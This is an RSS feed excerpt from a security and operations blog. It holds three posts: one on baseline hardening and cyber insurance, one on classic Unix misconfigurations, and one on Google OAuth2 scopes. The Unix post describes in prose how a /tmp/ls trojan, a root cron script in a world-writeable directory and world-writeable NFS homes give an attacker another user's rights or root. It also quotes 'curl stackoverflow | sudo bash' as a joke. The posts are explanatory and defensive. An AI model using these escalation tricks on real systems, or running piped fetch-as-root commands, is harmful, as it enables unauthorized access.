&lt;/blockquote&gt;
&lt;p&gt;Das ist Amtsdeutsch für &amp;ldquo;Benutzeraccounts ohne Passworte darf es nicht geben&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Danach kommen ein paar Anforderungen aus früheren Versionen des Dokumentes und eine, die für Angriffe nicht relevant ist, und dann gleich als nächstes SYS.1.1.A6 &amp;ldquo;Deaktivierung nicht benötigter Dienste&amp;rdquo;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Alle nicht benötigten Dienste und Anwendungen MÜSSEN deaktiviert oder deinstalliert werden, vor
allem Netzdienste.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Wir müssen den Portscan da oben im Licht dieser grundlegenden Grundanforderungen vom allergrundlegensten ersten Kapitel des Grundschutzes lesen, von dem es einleitend heißt&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Die folgenden Anforderungen MÜSSEN für den Baustein SYS.1.1 Allgemeiner Server vorrangig erfüllt
werden.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das war nicht der Fall.&lt;/p&gt;
&lt;p&gt;Damit ist auch die 99 %-Latte gerissen. Es geht stattdessen darum, dass überhaupt die allerersten grundlegenden Basisanforderungen nicht erfüllt werden, die man braucht, um überhaupt ernsthaft Security angehen zu können.&lt;/p&gt;
&lt;p&gt;Es ist üblicherweise nicht möglich eine Maschine in der von Rainer Sokoll dokumentierten Konfiguration produktiv zu betreiben, wenn irgendein Auditor einmal auch nur oberflächlich über eine Systemkonfiguration geguckt hat.
Wir können damit ausschließen, daß für dieses System und seine Betreiberorganisation ein Security-Review stattgefunden hat, und es ist wahrscheinlich, daß ein Sicherheitsprozess überhaupt nicht existiert.&lt;/p&gt;
&lt;p&gt;Wie dem auch sei: Prozente sind bei Security ein schwieriges Maß.
Ein kompromittiertes System ist ja nicht 43 % gehackt, sondern 100 % im Eimer.&lt;/p&gt;
&lt;p&gt;Ein besseres Bild: Raising the bar.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/10/this-tall.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Raising the bar&amp;rdquo; im Security-Sinne bedeutet üblicherweise, daß man den Personenkreis möglicher Angreifer verkleinern will, indem man versucht die Anforderungen höher zu schrauben, die ein erfolgreicher Angreifer an Ausbildung, finanzieller Ausstattung und Zeitaufwand mitbringen muss.&lt;/p&gt;
&lt;p&gt;Anders gesagt: &amp;ldquo;Unsere Systeme sind so konfiguriert, daß nicht jeder spaßorientierte Mensch auf Mate an einem langsamen Samstagabend in Quarantäne damit Karussell fahren kann.&amp;rdquo; wäre schon einmal ein guter Anfang.&lt;/p&gt;
&lt;p&gt;&amp;ldquo;99 % Sicherheit&amp;rdquo; würde in dieser Interpretation also bedeuten, daß 99 % der Population nicht in der Lage sind, die Installation im Vorübergehen mit dem Arsch einzureißen.
Aber wenn einer vom 1 % das tut, liegt das System dennoch 100 % am Boden. Das ist eine wichtige Beobachtung, über die wir weiter unten noch einmal reden müssen.&lt;/p&gt;
&lt;p&gt;So eine Konfiguration in der Produktion im öffentlichen Internet sagt aber auch etwas über die allgemeine Prozessreife in einer Organisation. Es ist statistisch eher ungewöhnlich, dass so konfigurierte Server mit sauberer und geplanter Software-Entwicklung von sicherheitskritischer Software korrelieren.&lt;/p&gt;
&lt;p&gt;Bei Software, die sagen wir einmal Führerscheindaten verwaltet, wäre es aber schon wichtig zu wissen, daß ihr Entwicklungsprozess Anforderungen genügt, die es erlauben, Aussagen über die Software bezüglich Verhalten, Sicherheit und dergleichen zu machen. Man will mindestens erst einmal nachvollziehen können, was da an Komponenten drin ist, und wer da wann warum welche Änderungen mit welchem Ziel vorgenommen hat, um dann an Tests zu sehen, daß das funktioniert hat.&lt;/p&gt;
&lt;h1 id=&#34;der-ccc-ist-mein-sicherheitscheck&#34;&gt;
    &lt;a href=&#34;#der-ccc-ist-mein-sicherheitscheck&#34;&gt;
	Der CCC ist mein Sicherheitscheck
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Der CCC ist kein Sicherheitsdienstleister.&lt;/p&gt;
&lt;p&gt;Als ich zuletzt nachgesehen habe war der CCC eine Vereinigung von Leuten mit dem Ziel, Spaß am Gerät zu haben. Das kann auch Dein Gerät sein, aber das ist dann eher schlecht für Dich.&lt;/p&gt;
&lt;p&gt;Auf keinen Fall ersetzt das ein Sicherheitskonzept. Ein Sicherheitskonzept würde&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ein organisatorisches und inhaltliches Konzept für die Anwendung haben,&lt;/li&gt;
&lt;li&gt;und dann einen Prozess, der dies in der Entwicklung umsetzt und dokumentiert, daß die Anforderungen erfüllt werden.&lt;/li&gt;
&lt;li&gt;Dann hätte man ein ebensolches Konzept für den Betrieb&lt;/li&gt;
&lt;li&gt;und einen Prozess, der dies im Betrieb umsetzt und dokumentiert, daß die Anforderungen erfüllt werden.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Und ganz wichtig:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;einen Plan, der umgesetzt wird, wenn es dann doch schief geht.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Denn es wird doch schief gehen - das sind dann die von Prof. Pohlmann angesprochenen Restrisiken.
&lt;a href=&#34;https://www.slideshare.net/isotopp/security-management-sys11-version-harald-wagener&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hier&lt;/a&gt;

 sind ein paar Slides von &lt;a href=&#34;https://twitter.com/mausdompteur&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Harald Wagener&lt;/a&gt;

, basierend auf Ideen von Harald und ein paar noch älteren Slides von mir.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/10/this-tall2.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Ein Risiko Management Prozess ist wie jeder Prozess eine Schleife, bei denen man Angreifer und Angriffe identifiziert, Risiken bewertet, Maßnahmen gegen die Risiken definiert und umsetzt, und dann wiederholt.
Die Maßnahmen können wir nicht beliebig weit treiben, denn betriebliche Notwendigkeiten setzen uns Grenzen: &amp;ldquo;Die Server abschalten und im Marianengraben versenken&amp;rdquo; ist keine Option.
Damit bleiben uns Restrisiken, die eventuell versicherbar sind.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/10/this-tall3.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Der Risiko-Managementprozess ist ein Prozess.
Er unterliegt einer Evaluierung in der Retrospektive, und dann Anpassungen.
Ich habe das &lt;a href=&#34;https://blog.koehntopp.info/2020/06/15/pizza-people-projects-and-processes.html&#34;&gt;am Beispiel einer Pizzeria&lt;/a&gt;

 anderswo schon einmal ausführlicher diskutiert.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/10/this-tall4.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Und während es super schwer ist, Security zu messen, gibt es immerhin Maße für Prozessreife, etwa das Capability Maturity Modell, über das wir auch im obigen Pizzeria-Beispiel reden.&lt;/p&gt;
&lt;p&gt;Und das bringt uns zu&lt;/p&gt;
&lt;h1 id=&#34;hackerterrorcybercyberversicherungen-und-der-umgang-mit-restrisiken&#34;&gt;
    &lt;a href=&#34;#hackerterrorcybercyberversicherungen-und-der-umgang-mit-restrisiken&#34;&gt;
	Hackerterrorcybercyberversicherungen und der Umgang mit Restrisiken
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Ich sagte weiter oben&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Aber wenn einer vom 1 % das tut, liegt das System dennoch 100 % am Boden. Das ist eine wichtige Beobachtung, über die wir weiter unten noch einmal reden müssen.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist hier.&lt;/p&gt;
&lt;p&gt;Eine HTCCV ist eine Versicherung, die Du abschließen kannst, um Schäden abzudecken, die auftreten, wenn Du dann doch gehackt wirst.
Der Versicherer übernimmt dann die Kosten aus Forderungen gegen Dich, die im Nachgang zu so einem Hack auftreten.&lt;/p&gt;
&lt;p&gt;Wenn Du so eine HTCCV haben willst, dann wird der Versicherer in der Regel seinen Taschenrechner anwerfen und Dir einen Tarif machen, der auf der Einschätzung Deiner Sicherheit durch einen von ihm beauftragten Auditor basiert.&lt;/p&gt;
&lt;p&gt;Das heißt, der Anbieter wird Dich nach den oben erwähnten Plänen für ein Risiko Management fragen, einen langen, strengen Blick auf die Pläne und ihre Umsetzung werfen, und danach die Prämie bemessen. Wenn er die Risiken für versicherbar hält.&lt;/p&gt;
&lt;p&gt;Wenn man nach dem Anruf beim Versicherer ein paar Tastendrücke hört, ein irres Kichern und dann einen Klick in der Leitung, dann ist das eher nicht der Fall - siehe den Portscan ganz oben.&lt;/p&gt;
&lt;p&gt;Als Inhaber einer HTCCV wird man also regelmäßig, meist jährlich oder im jährlichen Wechsel mit einer Datenschutz-Prüfung die Auditoren im Haus haben.
Sie werden jedes Mal einen grundlegenden Überblick haben wollen und jedes Jahr ein anderes Thema zur besonderen Vertiefung auswählen.&lt;/p&gt;
&lt;p&gt;Damit hat man auch den von mir oben geforderten Test mit Audit als Teil der Versicherungsauflagen.
Meiner persönlichen Erfahrung mit solchen Auditoren nach finden sie solche verscharchten Setups wie das ganz oben in weniger als 15 Sekunden.
Das deutet darauf hin, daß auch eine HTCCV für dieses Projekt eher nicht bestand.&lt;/p&gt;
&lt;h1 id=&#34;wir-werden-sowieso-gehackt-aufgeben-ist-eine-option&#34;&gt;
    &lt;a href=&#34;#wir-werden-sowieso-gehackt-aufgeben-ist-eine-option&#34;&gt;
	Wir werden sowieso gehackt, Aufgeben ist eine Option.
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Der Satz &amp;ldquo;Hundertprozentige Sicherheit gibt es nicht&amp;rdquo; wird gerne als erster Halbsatz der Aussage verwendet, die mit &amp;ldquo;und darum brauchen wir uns gar nicht anzustrengen.&amp;rdquo; endet.
Das ist auch der Tenor von Prof. Pohlmann oben.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/10/this-tall5.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&amp;ldquo;&lt;a href=&#34;https://quotes.yourdictionary.com/articles/who-said-hope-is-not-strategy.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hope is not a strategy&lt;/a&gt;

&amp;rdquo; ist nicht nur ein beliebtes Zitat, sondern auch ein gerne von Google SREs verwendetes Motto.&lt;/p&gt;
&lt;p&gt;Auch dem Laien ist intuitiv klar, dass &amp;ldquo;Aufgeben&amp;rdquo; keine skalierbare Strategie ist.
Ich habe hier versucht zu erklären, warum die Laien-Intuition genau auf den Punkt ist.&lt;/p&gt;
&lt;p&gt;Darum reden wir von Schutzlevel, &amp;ldquo;raising the bar&amp;rdquo; und wenn wir von Prozenten reden, dann eher mit Hinblick auf &amp;ldquo;wie viel Prozent von &lt;Grundmenge&gt; wären denn in der Lage, einen ernstzunehmenden Angriff vorzutragen?&amp;rdquo;
Also wieviel Zeit, Kapital und Ausbildung braucht ein Angreifer, um uns gefährlich werden zu können?&lt;/p&gt;
&lt;p&gt;Wenn es also in der Gemeinschaft von technikaffinen Personen auf Mate Vorbehalte gegen dieses Führerschein ID-Wallet gibt, und Widerspruch gegen die Haltung von Prof. Pohlmann, dann deswegen.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Why do Ops and Sec people wear black</title>
      <link>https://blog.koehntopp.info/2020/08/19/why-do-ops-and-sec-people-wear-black.html</link>
      <pubDate>Wed, 19 Aug 2020 17:05:47 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2020/08/19/why-do-ops-and-sec-people-wear-black.html</guid>
      <description>&lt;p&gt;For &lt;a href=&#34;https://www.imdb.com/title/tt0108756&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;reasons that don&amp;rsquo;t need exploring at this juncture&lt;/a&gt;

 I &lt;a href=&#34;https://twitter.com/isotopp/status/1296073392655933444&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tweeted&lt;/a&gt;

&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Once upon a time there were shared boxes, on which the local Unix easily had 200-300 users, Junior Developers at a University.&lt;/p&gt;
&lt;p&gt;A /tmp/ls found easily 3-4 people per day that had . (dot) in their path.&lt;/p&gt;
&lt;p&gt;No particular reason. Why?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;and followed up with&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hope is not a strategy.&lt;/p&gt;
&lt;p&gt;Neither is &lt;code&gt;curl stackoverflow | sudo bash&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;tmpls&#34;&gt;
    &lt;a href=&#34;#tmpls&#34;&gt;
	/tmp/ls
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;I was asked to explain: &amp;ldquo;What is /tmp/ls?&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;/tmp/ls is a shell script installed as executable in /tmp/ls. If you have . (dot, the current directory) early in your path, it shadows the command /bin/ls, which you use to list the current directory.&lt;/p&gt;
&lt;p&gt;So when you &lt;code&gt;cd /tmp&lt;/code&gt; and then &lt;code&gt;ls&lt;/code&gt; you are executing my script instead of the actual &lt;code&gt;/bin/ls&lt;/code&gt; command. You are now inadvertently running my code under your permissions. When I finish my script with &lt;code&gt;exec /bin/ls &amp;quot;$@&amp;quot;&lt;/code&gt; you won&amp;rsquo;t even notice, because it will run the normal &lt;code&gt;/bin/ls&lt;/code&gt; command at the end.&lt;/p&gt;
&lt;p&gt;The mistake is to have any directory in your path that can contain code controlled by another person besides you and root. That is, a world-writeable &lt;code&gt;/usr/local/bin&lt;/code&gt; in - say - an AIX install would amount to the same exposure (A lot of old Unices such as AIX, HP/UX and SGI would ship with world writeable directories of one kind or the other by default).&lt;/p&gt;
&lt;h2 id=&#34;the-777-root-cron&#34;&gt;
    &lt;a href=&#34;#the-777-root-cron&#34;&gt;
	The 777 root cron
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The same scenario is a script globally installed on all Macs by JAMF, running through cron as root every minute. The same JAMF sets the enclosing directory to 777 (full access for everybody). Due to how permissions work in Unix, this allows anybody to remove, rename or replace the script itself, no matter what the script permissions are.&lt;/p&gt;
&lt;p&gt;It is instant root for anybody who cares: You replace the script with your own content, wait a minute for the cron to hit it, and put the original script back. Or not, depending on how you feel that day.&lt;/p&gt;
&lt;p&gt;The remarkable part of this particular incident is that none of the multitude of endpoint security products also installed by the same JAMF detected or quarantined this script. So much for that.&lt;/p&gt;
&lt;h2 id=&#34;the-world-writeable-fileshare&#34;&gt;
    &lt;a href=&#34;#the-world-writeable-fileshare&#34;&gt;
	The world writeable fileshare
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Other fun things that should not have happened: A university of applied science exported their AIX home directories by NFS, world-writeable, once. That is, for several years, their site was a well known Shell-o-matic.&lt;/p&gt;
&lt;p&gt;Why is this bad?&lt;/p&gt;
&lt;p&gt;Anybody who mounted this on their own machine could create a user account with a matching UID, go into the mounted user home and drop a .rlogin file of appropriate content (The .rlogin reference should tell you how old that is).&lt;/p&gt;
&lt;p&gt;The fun part is that the university in question eventually migrated to Solaris, and that included all the&amp;hellip; interesting configuration.&lt;/p&gt;
&lt;p&gt;Apparently SMB fileshares can serve the same purpose. Also, Windows always has . (dot) in the front of the path, implicitly.&lt;/p&gt;
&lt;h2 id=&#34;external-storage&#34;&gt;
    &lt;a href=&#34;#external-storage&#34;&gt;
	External storage
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;A lot of people have world-readable backup devices such as a 644 /dev/rmt. If the backup tape from last night is left in that drive it does not matter much what the permissions on the original files are.&lt;/p&gt;
&lt;p&gt;You can read the files from backup, and restore them with any permission you like.&lt;/p&gt;
&lt;h2 id=&#34;this-makes-me-sad&#34;&gt;
    &lt;a href=&#34;#this-makes-me-sad&#34;&gt;
	This makes me sad
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;For some reasons each of these things, all of which are from personal experience up to 25 years ago, still happen today.&lt;/p&gt;
&lt;p&gt;That is why ops people wear black. Now you know.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Mailbox.org, Google, OAuth und Less Secure Applications</title>
      <link>https://blog.koehntopp.info/2020/01/17/mailboxorg-google-oauth-und-less-secure-applications.html</link>
      <pubDate>Fri, 17 Jan 2020 18:44:34 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2020/01/17/mailboxorg-google-oauth-und-less-secure-applications.html</guid>
      <description>&lt;p&gt;Heise schreibt in
&lt;a href=&#34;https://www.heise.de/ix/meldung/Mailbox-org-Google-sperrt-unsichere-Dritte-von-Kalender-aus-4640540.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mailbox.org: Google sperrt &amp;ldquo;unsichere&amp;rdquo; Dritte vom Kalender aus&lt;/a&gt;


über Anwendungen von Dritten und den Zugriff auf Google Kalender, Google Mail und andere Dienste, die mit GSuite interagieren. Der Artikel wirft leider eine Reihe von Dingen durcheinander, was schade ist, weil er einen wichtigen Punkt machen will.&lt;/p&gt;
&lt;h2 id=&#34;oauth2-vs-lsa&#34;&gt;
    &lt;a href=&#34;#oauth2-vs-lsa&#34;&gt;
	OAuth2 vs. LSA
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Im Artikel geht es um &lt;a href=&#34;https://en.wikipedia.org/wiki/OAuth&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OAuth2&lt;/a&gt;

. OAuth2 ist kein neues Verfahren. Es handelt sich um einen Standard, bei dem ein Dienstleister Drittanwendungen den Zugriff auf Dienste erlaubt, indem er der Drittanwendung relativ automatisch ein Logintoken zuteilt, das&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;zeitlich begrenzt ist&lt;/li&gt;
&lt;li&gt;die Identifikation der Anwendung und&lt;/li&gt;
&lt;li&gt;des Anwenders erlaubt und&lt;/li&gt;
&lt;li&gt;einen Scope (einen Satz eingeschränkte Zugriffsrechte) hat.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Um also auf den Google Kalender oder in Zukunft bald auch IMAP zugreifen zu können, muß eine Drittanwendung ein Token vorzeigen. Das Token, das etwa Busycal auf dem Mac verwendet, ist von dem Token verschieden, mit dem ACal+ auf Android auf meinen Google Kalender zugreift. Theoretisch könnte Busycal auch Vollzugriff auf den Kalender haben, während das ACal+ Token einen Read-Only Scope hat.&lt;/p&gt;
&lt;p&gt;Beide sind verschieden von meinem mit 2FA gesicherten Zugang zu meinem Google Account, der nicht nur Kalender und Mail enthält, sondern auch mein Wallet, meine gekauften Inhalte, mein Youtube, meinen Google Cloud Zugang und meine Google Ads. Wird durch eine Sicherheitslücke eines der Token publik, ist das kein Beinbruch (der Schaden ist auf den Scope begrenzt) und leicht zu korrigieren (die Zugriffsrechte sind wiederrufbar).&lt;/p&gt;
&lt;p&gt;Google gibt einem eine Security-Übersicht für Deinen Account in &lt;a href=&#34;https://myaccount.google.com/security&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Google Account&lt;/a&gt;

. Auf der &lt;a href=&#34;https://myaccount.google.com/permissions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Permissions&lt;/a&gt;

-Seite kann man sehen, wer Zugriff hat und was die dürfen. Nach Anklicken sieht man auch, wann das war und man kann den Zugriff wiederrufen.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-review-screen.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://myaccount.google.com/permissions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Permissions&lt;/a&gt;

 Seite für OAuth2 Anwendungen in &lt;a href=&#34;https://myaccount.google.com/security&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Google Account&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;Das alles ist eine Feine Sache™ und ein großer Fortschritt. In der Vergangenheit hätte man sich bei einem CalDAV oder IMAP Server mit dem Usernamen und Paßwort eingeloggt, und hätte dadurch den gesamten Google Account mit allen Diensten, die da dran hängen, exponiert und gefährdet. In so einem Kontext ist insbesondere der Wiederruf und die Recovery nach einem Security-Problem so gut wie unmöglich.&lt;/p&gt;
&lt;p&gt;Das weiß Google auch, und daher gab es bisher für Programme, die OAuth2 nicht beherrschen, eine Sonderlocke: &amp;ldquo;Application Specific Passwords for Less Secure Applications&amp;rdquo; (LSA).&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-appspecific-passwords.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&amp;ldquo;Application Specific Passwords for Less Secure Applications&amp;rdquo; (LSA) ist auch in Google Account zu finden und hoffentlich leer.&lt;/p&gt;
&lt;p&gt;Mit LSA legt man ein Kennwort für seinen Loginnamen fest, das an eine Anwendung gebunden ist und gescoped ist, also im Zugriff beschränkt. Da Google dieses Paßwort generiert, ist es auch sicher vom Accountpaßwort verschieden.&lt;/p&gt;
&lt;p&gt;Man kann sich also mit einem Legacy Client, der auch in 2020 noch kein OAuth2 kann, auf einem GMail IMAP oder CalDAV einloggen und riskiert dennoch nicht seinen ganzen Account. Gut so.&lt;/p&gt;
&lt;h2 id=&#34;oauth2-playground&#34;&gt;
    &lt;a href=&#34;#oauth2-playground&#34;&gt;
	OAuth2 Playground
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Es gibt einen &lt;a href=&#34;https://developers.google.com/oauthplayground/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OAuth2 Playground&lt;/a&gt;

 bei Google. Mit dem und der &lt;a href=&#34;https://developers.google.com/identity/protocols/OAuth2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Entwicklerdokumentation&lt;/a&gt;

 kann man einmal herumspielen. Oder man verwendet deren &lt;a href=&#34;https://github.com/google/gmail-oauth2-tools/wiki/OAuth2DotPyRunThrough&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;oauth2.py&lt;/a&gt;

. Für jeden Dienst gibt es eine Dokumentation, die die OAuth2 Scopes beschreibt, die existieren.&lt;/p&gt;
&lt;p&gt;Hier ist die &lt;a href=&#34;https://developers.google.com/gmail/api/auth/scopes&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Dokumentation für GMail Scopes&lt;/a&gt;

. Sie ist wichtig, wir werden weiter unten noch darauf zurück kommen.&lt;/p&gt;
&lt;p&gt;Wenn man den OAuth2 Playground einmal durchspielt passiert dies:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-oauth2-playground-1.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Schritt 1: Wähle einen OAuth2 Scope aus, hier gmail.readonly. Auf der rechten Seite sieht man die entsprechenden REST Requests und Responses, sodaß ein Entwickler gleich sehen kann, wie so etwas auf dem Kabel aussieht. In der Praxis wird dieser Schritt vom Anwendungsentwickler ausgeführt und man sieht ihn nicht.&lt;/p&gt;
&lt;p&gt;Er legt die Identität der Anwendung fest, so wie sie für den Endanwender nachher in Google Account erscheint.&lt;/p&gt;
&lt;p&gt;Führt man diesen Schritt durch, gibt es einen typischen Google Autorisierungscreen: Anwendung Google Playground will Read Access auf unseren Gmail Account. Ist das okay so?&lt;/p&gt;
&lt;p&gt;Sagt man ja, gibt es einen Alarm via Push Notification und eine Nachricht in Google Mail: Jemand hat neuen Zugriff auf unseren Account bekommen.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-cellphone.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Terror auf meinem Handy: &amp;ldquo;Google OAuth2 Playground&amp;rdquo; darf jetzt auf mein GMail.&lt;/p&gt;
&lt;p&gt;Das ist auch eine Gute Sache™, denn auf diese Weise ist sichergestellt, daß so ein Zugriff nicht leise und aus Versehen erfolgt.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-oauth2-playground-2.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Mit dem Authorization Code aus Schritt 1 kann die Anwendung sich jetzt ein Zugriffstoken holen, das eine Stunden gilt. Der Grund ist, daß auf diese Weise die Anwendung auf jeden Fall spätestens eine Stunde nach dem Widerruf von Rechten ausgesperrt ist, auch wenn dieses spezifische Token nicht gesondert widerrufen wird.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2020/01/lsa-oauth2-playground-3.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Und mit diesem Access Token kann die Anwendung dann endlich GMail API Funktionen aus dem Read Only Scope aufrufen, zum Beispiel Identity. Sie kann keine Non-GMail Aktionen ausführen und sie kann auch keine Nachrichten senden, Filter bearbeiten oder ähnliches. Das wäre ein anderer Scope.&lt;/p&gt;
&lt;h2 id=&#34;scopes-in-gmail&#34;&gt;
    &lt;a href=&#34;#scopes-in-gmail&#34;&gt;
	Scopes in GMail
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Die Liste der &lt;a href=&#34;https://developers.google.com/gmail/api/auth/scopes&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Gmail Scopes&lt;/a&gt;

 in der Entwicklerdokumentation klassifiziert Scopes auf verschiedene Weisen, Recommended, Sensitive und Restricted. Die meisten Scopes sind Restricted.&lt;/p&gt;
&lt;p&gt;Die Doku sagt weiter:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Restricted—These scopes provide wide access to Google User Data and require you to go through a restricted scope verification process. For information on this requirement, see Google API Services: User Data Policy and Additional Requirements for Specific API Scopes. If you store restricted scope data on servers (or transmit), then you need to go through a security assessment.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Wenn man also eine Serveranwendung (Mailbox.org, Exchange, Open Exchange oder ähnliches) schreibt, und diese Restricted Scope Data runterlädt und speichert, dann wird ein Security Assessment notwendig.&lt;/p&gt;
&lt;h2 id=&#34;den-heise-artikel-noch-einmal-lesen&#34;&gt;
    &lt;a href=&#34;#den-heise-artikel-noch-einmal-lesen&#34;&gt;
	Den Heise Artikel noch einmal lesen
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Jetzt lesen wir den &lt;a href=&#34;https://www.heise.de/ix/meldung/Mailbox-org-Google-sperrt-unsichere-Dritte-von-Kalender-aus-4640540.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Heise Artikel&lt;/a&gt;

 noch einmal.&lt;/p&gt;
&lt;p&gt;Da heißt es:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Google forciert den Einsatz von Oauth für seine Mail-, Kalender- und Drive- Dienste, sperrt dabei aber viele Dienstleister und ältere Software aus. Wer bisher beispielsweise Googles Kalender in einer nicht von Google entwickelten Anwendung oder Webseite ohne Oauth integriert, muss sich demnächst entweder umstellen oder darauf hoffen, dass sich sein Anbieter von Google-Partnern in den USA in einem kostspieligen und wenig transparenten Verfahren zertifizieren lässt.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Was heißt das? Der Artikel erklärt das nicht.&lt;/p&gt;
&lt;p&gt;Google hat bereits am 30. Oktober letzten Jahres &lt;a href=&#34;https://gsuiteupdates.googleblog.com/2019/07/limit-access-LSA.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LSA für Business Kunden&lt;/a&gt;

 sanft eingeschränkt. Alle Accounts mit einer leeren LSA Liste haben &amp;ldquo;LSA erlauben&amp;rdquo; auf &amp;ldquo;Nein&amp;rdquo; gestellt bekommen, für andere Accounts, die LSA Einträge haben, sind andere Einschränkungen gemacht worden.&lt;/p&gt;
&lt;p&gt;Ab Mitte diesen Jahres wird &lt;a href=&#34;https://gsuiteupdates.googleblog.com/2019/12/less-secure-apps-oauth-google-username-password-incorrect.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LSA weiter eingeschränkt&lt;/a&gt;

.&lt;/p&gt;
